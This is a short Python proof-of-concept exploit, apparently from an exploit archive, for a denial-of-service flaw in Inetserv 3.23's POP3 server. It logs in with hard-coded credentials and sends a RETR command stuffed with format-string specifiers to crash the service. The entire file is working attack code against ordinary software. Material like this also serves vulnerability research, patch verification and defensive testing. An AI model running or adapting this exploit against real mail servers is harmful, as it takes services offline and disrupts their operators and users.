#!/usr/bin/python
# Exploit Title: Inetserv 3.23 POP3 DoS
# Date: 1/24/2011
# Author: dmnt (thx G13 for base)
# Software Link: http://www.avtronics.net/inetserv.php
# Version: 3.23
# DoS in RETR and DELE

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "RETR " + "%s" * 40 + "\r\n" # or DELE

s.connect(('127.0.0.1',110))

data=s.recv(1024)
s.send("USER admin\r\n")
data=s.recv(1024)
s.send("PASS 123456\r\n")
data=s.recv(1024)
s.send(buffer)

s.close()